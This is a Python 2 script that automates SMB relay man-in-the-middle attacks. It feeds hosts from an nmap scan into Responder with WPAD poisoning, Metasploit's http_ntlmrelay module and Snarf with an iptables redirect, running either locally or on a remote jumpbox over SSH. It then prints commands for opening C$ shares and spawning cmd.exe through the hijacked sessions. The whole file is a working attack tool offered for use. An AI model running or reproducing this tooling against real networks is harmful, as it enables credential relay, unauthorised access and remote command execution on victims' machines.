#!/usr/bin/env python2

import os
import sys
import getpass
import argparse
import time
import urllib2
import paramiko
from scp import SCPClient, SCPException
from shutil import copyfile, move
from subprocess import Popen, PIPE
from sshtunnel import SSHTunnelForwarder
from libnmap.process import NmapProcess
from netifaces import interfaces, ifaddresses, AF_INET
from libnmap.parser import NmapParser, NmapParserException

def parse_args():
    '''
    Create the arguments
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-x", "--nmapxml", help="Location of nmap XML file")
    parser.add_argument("-f", "--home-dir", default='/opt/', help="The folder to install the various tools to; e.g. -d '/opt/'")
    parser.add_argument("-i", "--interface", help="The interface that Responder and Snarf will start use")
    parser.add_argument("-r", "--remote", help="The jumpbox IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="The jumpbox SSH port")
    return parser.parse_args()

def get_git_project(github_url, home_dir):
    '''
    Install git projects and check for errors
    '''
    proj_name = github_url.split('/')[-1]
    folder = home_dir+proj_name+'/'
    exists = os.path.isdir(folder)
    if exists == False:
        cmd = 'git clone {} {}'.format(github_url,folder)
        out, err, pid = run_cmd(cmd)
        install_checker(err, proj_name)

def install_checker(err, proj_name):
    '''
    Check for errors after installing git projects
    '''
    if err != '':
        # git will pipe "Cloning into '/opt/path'..." into err
        # for some reason
        if 'Cloning into' not in err:
            sys.exit('[-] Failed to install '+proj_name+':'+'\n\n'+err)

def get_smb_hosts(report):
    '''
    Read the nmap XML and parse out SMB clients
    '''
    smb_hosts = []
    for host in report.hosts:
        ip = host.address
        if host.is_up():
            for s in host.services:
                if s.port == 445 and s.state == 'open':
                    smb_hosts.append(host.address)

    with open('smb_hosts.txt', 'w') as smb:
        for h in smb_hosts:
            smb.write(h+'\n')

def get_nodejs():
    '''
    Install nodejs
    '''
    cmd = 'apt-get install nodejs -y'
    out, err, pid = run_cmd(cmd)
    install_checker(err, 'nodejs')
    if 'is already the newest version' in out:
        print '[*] Nodejs already installed'
    elif 'Setting up nodejs' in out:
        print '[*] Successfully installed nodejs'

def run_cmd(cmd):
    '''
    Runs a command and returns the output and error msgs
    If given a list of commands, it just runs them all and returns nothing
    '''
    # Only cleanup() will give it a list
    if type(cmd) == list:
        for c in cmd:
            print '[*] Running: {}'.format(c)
            os.system(c)
    else:
        print '[*] Running: {}'.format(cmd)
        proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
        pid = proc.pid
        out, err = proc.communicate()
        return out, err, pid

def start_msf_http_relay(ip, home_dir):
    '''
    Starts http relaying with msfconsole
    '''
    options = 'use auxiliary/server/http_ntlmrelay\n'
    options += 'set URIPATH /wpad.dat\n'
    options += 'set SRVHOST {}\n'.format(ip)
    options += 'set SRVPORT 80\n'
    options += 'set RHOST {}\n'.format(ip)
    options += 'set RPORT 445\n'
    options += 'set RTYPE SMB_LS\n'
    options += 'run'
    with open('{}http_relay.rc'.format(home_dir), 'w') as f:
        f.write(options)

    # Start MSF on jumpbox
    # MUST 'msfconsole -L' or else screen exits as soon as it 
    # reaches end of script
    cmd = 'screen -S http-relay -dm msfconsole -L -r {}http_relay.rc'.format(home_dir)
    out, err, msf_pid = run_cmd(cmd)
    return msf_pid

def start_responder(iface, home_dir):
    '''
    Starts Responder for relaying SMB
    '''
    github_url = 'https://github.com/SpiderLabs/Responder'
    get_git_project(github_url, home_dir)
    adjust_responder_conf(home_dir)

    cmd = 'screen -S relay-responder -dm python \
{}Responder/Responder.py -I {} -r -d --wpad'.format(home_dir, iface)
    out, err, resp_pid = run_cmd(cmd)
    return resp_pid

def adjust_responder_conf(home_dir):
    '''
    Changes Responder.conf to work with snarf
    '''
    relay_conf = []
    r = urllib2.urlopen('https://raw.githubusercontent.com/SpiderLabs/Responder/master/Responder.conf')
    conf_file = r.read()
    with open('orig-Responder.conf', 'w') as o:
        o.write(conf_file)
    copyfile('orig-Responder.conf', 'copy-Responder.conf')
    with open('copy-Responder.conf', 'r') as c:
        for line in c.readlines():
            if 'SMB = On\n' == line:
                relay_conf.append('SMB = Off\n')
            elif 'HTTP = On\n' == line:
                relay_conf.append('HTTP = Off\n')
            elif 'HTTPS = On\n' == line:
                relay_conf.append('HTTPS = Off\n')
            else:
                relay_conf.append(line)
    with open('Responder.conf', 'w') as r:
        for line in relay_conf:
            r.write(line)

    move('Responder.conf', '{}Responder/Responder.conf'.format(home_dir))

def cleanup(pids, home_dir):
    '''
    Kills all the processes created
    '''
    print '[*] Cleaning up...'
    for p in pids:
        print '[*] Killing {}'.format(p[1])
        os.system('kill {}'.format(p[0]))

    cmds = ["iptables -t nat -F",
            "iptables -t nat -X"]
    run_cmd(cmds)

    orig_conf = os.getcwd()+'/orig-Responder.conf'
    resp_conf = '{}Responder/Responder.conf'.format(home_dir)
    move(orig_conf, resp_conf)
    os.remove('copy-Responder.conf')
    print '[*] Done'

def confirm(pids):
    '''
    Confirms snarf, msfconsole, and responder are all running
    '''
    errors = False
    print '\n[*] Confirming all tools are running...'
    for pid in pids:
        pid = pid
        proc_running = is_process_running(pid[0])
        if proc_running == False:
            print '[-] Error: {} not running'.format(pid[1])
            errors = True

    if errors == False:
        print '    \_ Confirmed'

def is_process_running(process_id):
    try:
        os.kill(process_id, 0)
        return True
    except OSError:
        return False

################
# JUMPBOX CODE #
################

def jumpbox_ip_interface(ssh, iface):
    cmd = 'ip addr'
    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
    out = stdout.readlines()
    for l in out:
        l = l.split()
        if len(l) > 1:
            if iface in l[1]:
                # comes out as "eth0:" so we get rid of the colon
                if 'inet' in l[0]:
                    # comes out as "10.0.0.1/25" so we get rid of /25
                    ip = l[1].split('/')[0]
                    return ip

def remote_check_for_folder(ssh, folder, check_error=False):
    cmd = 'cd {}'.format(folder)
    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=False)
    cd_err = stderr.read()
    if 'No such file or directory' in cd_err:
        return False
    else:
        return True

def remote_get_git_project(ssh, github_url, home_dir):
    proj_name = github_url.split('/')[-1]
    folder = remote_check_for_folder(ssh, '{}{}'.format(home_dir, proj_name))
    if folder == False:
        cmd = 'cd {} && git clone {}'.format(home_dir, github_url)
        stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)

def run_jumpbox_cmd(ssh, cmd, check_error):
    print '[*] Running on jumpbox: {}'.format(cmd)
    stdin, stdout, stderr = ssh.exec_command(cmd)
    if check_error == True:
        get_errors(stderr)
    return (stdin, stdout, stderr)

def ssh_L(remote_host, forw_port, user, pw):
    server = SSHTunnelForwarder((remote_host, 22),
                                ssh_username=user,
                                ssh_password=pw,
                                remote_bind_address=('127.0.0.1', forw_port),
                                local_bind_address=('127.0.0.1', forw_port))
    return server

def ssh_client(server, port, user, pw):
    '''
    Creates the SSH client using paramiko
    '''
    print '[*] Setting up the SSH connection...'
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    # Auto add host keys to known_keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server, port, user, pw)
    except paramiko.AuthenticationException:
        sys.exit('[-] Authentication failed')
    print '    \_ Done'
    return client

def remote_start_msf_http_relay(ssh, scp, j_local_ip, home_dir):
    options = 'use auxiliary/server/http_ntlmrelay\n'
    options += 'set URIPATH /wpad.dat\n'
    options += 'set SRVHOST {}\n'.format(j_local_ip)
    options += 'set SRVPORT 80\n'
    options += 'set RHOST {}\n'.format(j_local_ip)
    options += 'set RPORT 445\n'
    options += 'set RTYPE SMB_LS\n'
    options += 'run'
    with open('http_relay.rc', 'w') as f:
        f.write(options)

    # SCP the http_relay script up to jumpbox
    local_path = os.getcwd()+'/http_relay.rc'
    remote_path = '{}http_relay.rc'.format(home_dir)
    scp.put(local_path, remote_path)

    # Start MSF on jumpbox
    # MUST 'msfconsole -L' or else screen exits as soon as it reaches end of script
    cmd = 'screen -S http-relay -dm msfconsole -L -r {}http_relay.rc'.format(home_dir)
    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=False)

def get_errors(stderr):
    if stderr != None:
        err = stderr.readlines()
        if len(err) > 0:
            print '[!] Error:'
            for l in err:
                print '          '+l

def remote_start_responder(ssh, scp, iface, home_dir):
    github_url = 'https://github.com/SpiderLabs/Responder'
    remote_get_git_project(ssh, github_url, home_dir)

    remote_adjust_responder_conf(scp, home_dir)

    cmd = 'screen -S relay-responder -dm python {}Responder/Responder.py -I {} -r -d --wpad'.format(home_dir, iface)
    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)

def remote_adjust_responder_conf(scp, home_dir):
    relay_conf = []
    r = urllib2.urlopen('https://raw.githubusercontent.com/SpiderLabs/Responder/master/Responder.conf')
    conf_file = r.read()
    with open('orig-Responder.conf', 'w') as o:
        o.write(conf_file)
    copyfile('orig-Responder.conf', 'copy-Responder.conf')
    with open('copy-Responder.conf', 'r') as c:
        for line in c.readlines():
            if 'SMB = On\n' == line:
                relay_conf.append('SMB = Off\n')
            elif 'HTTP = On\n' == line:
                relay_conf.append('HTTP = Off\n')
            elif 'HTTPS = On\n' == line:
                relay_conf.append('HTTPS = Off\n')
            else:
                relay_conf.append(line)
    with open('relay-Responder.conf', 'w') as r:
        for line in relay_conf:
            r.write(line)

    local_path = os.getcwd()+'/relay-Responder.conf'
    remote_path = '{}Responder/Responder.conf'.format(home_dir)
    scp.put(local_path, remote_path)

def remote_cleanup(ssh, scp, forw_server, home_dir):
    print '[*] Cleaning up...'
    forw_server.stop()
    ssh.exec_command("ps aux | grep -i 'SCREEN -S snarf -dm nodejs /opt/snarf/snarf.js -f \
/opt/snarf/smb_hosts.txt' | grep -v grep | awk '{print $2}' | xargs kill")
    ssh.exec_command("ps aux | grep -i 'SCREEN -S http-relay -dm msfconsole -L -r \
/opt/http_relay.rc' | grep -v grep | awk '{print $2}' | xargs kill")
    ssh.exec_command("ps aux | grep -i 'SCREEN -S relay-responder -dm python \
/opt/Responder/Responder.py -I eth0 -r -d --wpad' | grep -v grep | awk '{print $2}' | xargs kill")
    ssh.exec_command("rm {}http_relay.rc".format(home_dir))
    ssh.exec_command("iptables -t nat -F")
    ssh.exec_command("iptables -t nat -X")
    os.remove('copy-Responder.conf')

    local_path = os.getcwd()+'/orig-Responder.conf'
    remote_path = '{}Responder/Responder.conf'.format(home_dir)
    scp.put(local_path, remote_path)
    print '      \_ Done'

def remote_confirm(ssh):
    err = False
    print '\n[*] Confirming all tools are running...'
    stdin, stdout, stderr = ssh.exec_command("ps aux | grep -i 'SCREEN -S snarf -dm nodejs \
/opt/snarf/snarf.js -f /opt/snarf/smb_hosts.txt' | grep -v grep")
    if 'screen -s snarf -dm nodejs' not in stdout.read().lower():
        print '[-] Error: Snarf not running on the remote device'
        err = True

    stdin, stdout, stderr = ssh.exec_command("ps aux | grep -i 'SCREEN -S http-relay -dm msfconsole \
-L -r /opt/http_relay.rc' | grep -v grep")
    if 'screen -s http-relay -dm msfconsole' not in stdout.read().lower():
        print '[-] Error: MSF http_relay not running on the remote device'
        err = True

    stdin, stdout, stderr = ssh.exec_command("ps aux | grep -i 'SCREEN -S relay-responder -dm \
python /opt/Responder/Responder.py -I eth0 -r -d --wpad' | grep -v grep")
    if 'screen -s relay-responder -dm python' not in stdout.read().lower():
        print '[-] Error: Responder not running on the remote device'
        err = True

    if err == False:
        print '    \_ Confirmed'


####################
# END JUMPBOX CODE #
####################

def remote_main(args):

    # Initial var setup
    home_dir = args.home_dir
    jumpbox_ip = args.remote
    iface = args.interface
    port = args.port
    forw_port = 4001
    user = raw_input('[+] Username for the remote jumpbox: ')
    pw = getpass.getpass()
    ssh = ssh_client(jumpbox_ip, port, user, pw)
    scp = SCPClient(ssh.get_transport())
    report = NmapParser.parse_fromfile(args.nmapxml)
    j_local_ip = jumpbox_ip_interface(ssh, iface)

    # Print vars
    print '[*] Jumpbox IP: {}'.format(jumpbox_ip)
    print '[*] Jumpbox local IP: {}'.format(j_local_ip)
    print '[*] Forwarding jumpbox port {} to local port {}'.format(forw_port, forw_port)

    # Get Snarf
    github_url = 'https://github.com/purpleteam/snarf'
    remote_get_git_project(ssh, github_url, home_dir)

    # Get Nodejs
    cmd = 'apt-get install nodejs -y'
    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)

    # Get SMB hosts
    report = NmapParser.parse_fromfile(args.nmapxml)
    get_smb_hosts(report)
    local_path = os.getcwd()+'/smb_hosts.txt'
    remote_path = '{}snarf/smb_hosts.txt'.format(home_dir)
    try:
        scp.put(local_path, remote_path)
    except scp.SCPException:
        sys.exit('[-] Failed to copy smb_hosts.txt to the remote jumpbox')

    # Run Snarf
    cmd = 'screen -S snarf -dm nodejs {}snarf/snarf.js -f {}snarf/smb_hosts.txt {}'.format(home_dir, home_dir, j_local_ip)
    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
    time.sleep(5) # Give snarf time to startup
    cmd = 'iptables -t nat -A PREROUTING -p tcp --dport 445 -j SNARF'
    stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)

    # Start forwarding port 4001
    forw_server = ssh_L(jumpbox_ip, forw_port, user, pw)
    forw_server.start()

    # Start MSF http_relay
    remote_start_msf_http_relay(ssh, scp, j_local_ip, home_dir)

    # Start Responder
    remote_start_responder(ssh, scp, iface, home_dir)

    # Confirm everything's running
    remote_confirm(ssh)

    print '\n[+] Done! Point your browser to http://localhost:4001 and refresh it every few minutes to see MITM\'d SMB connections'
    print '    After a connection has expired or you manually expire and choose it run on the jumpbox:'
    print '       smbclient -U a%a //127.0.0.1/C$'
    print '    If the initiator of the SMB connection has admin rights try:'
    print '       winexe -U a%a //127.0.0.1/ cmd.exe'
    print '\n[*] Ctrl-C to cleanup'

    try:
        while 1:
            time.sleep(10)
    except KeyboardInterrupt:
        remote_cleanup(ssh, scp, forw_server, home_dir)
        sys.exit()

def local_main(args):

    home_dir = args.home_dir
    iface = args.interface
    try:
        ip = ifaddresses(iface)[AF_INET][0]['addr']
    except ValueError:
        sys.exit('[-] Provide a valid interface. See interfaces with `ip addr`')
    report = NmapParser.parse_fromfile(args.nmapxml)

    # Get Snarf
    github_url = 'https://github.com/purpleteam/snarf'
    get_git_project(github_url, home_dir)

    # Get Nodejs
    get_nodejs()

    # Start MSF http_relay
    msf_pid = start_msf_http_relay(ip, home_dir)

    # Get SMB hosts
    report = NmapParser.parse_fromfile(args.nmapxml)
    get_smb_hosts(report)

    # Run Snarf
    cmd = 'screen -S snarf -dm nodejs {}snarf/snarf.js -f smb_hosts.txt {}'.format(home_dir, ip)
    time.sleep(1) # If this isn't here the PID of the snarf screen is -3 compared to ps faux??
    out, err, snarf_pid = run_cmd(cmd)

    # Run Snarf iptables cmd
    time.sleep(5) # Give snarf time to startup
    cmd = 'iptables -t nat -A PREROUTING -p tcp --dport 445 -j SNARF'
    out, err, iptables_pid = run_cmd(cmd)

    # Start Responder
    resp_pid = start_responder(iface, home_dir)

    # Check that everything ran as it should
    # Need pid+1 because screen -Sdm causes a fork and execcve
    # forcing the real screen process to become pid+1
    pids = [(resp_pid+1, 'Responder'),
            (msf_pid+1, 'Metasploit http_relay'),
            (snarf_pid+1, 'Snarf')]
    confirm(pids)

    print '\n[+] Done! Point your browser to http://localhost:4001 and refresh it every few minutes to see MITM\'d SMB connections'
    print '    After a connection has expired or you manually expire and choose it run:'
    print '       smbclient -U a%a //127.0.0.1/C$'
    print '    If the initiator of the SMB connection has admin rights try:'
    print '       winexe -U a%a //127.0.0.1/ cmd.exe'
    print '\n[*] Ctrl-C to cleanup'

    try:
        while 1:
            time.sleep(10)
    except KeyboardInterrupt:
        cleanup(pids, home_dir)
        sys.exit()

def main(args):

    # Initial var setup
    if os.geteuid():
        sys.exit('[-] Run as root')
    if not args.nmapxml:
        sys.exit('[-] Include an nmap XML file for determining SMB hosts, e.g. -x network.xml')
    if not args.interface:
        sys.exit('[-] Include an interface for which Responder and Snarf will utilize, e.g. -i eth0')

    if args.remote:
        remote_main(args)
    else:
        local_main(args)

main(parse_args())

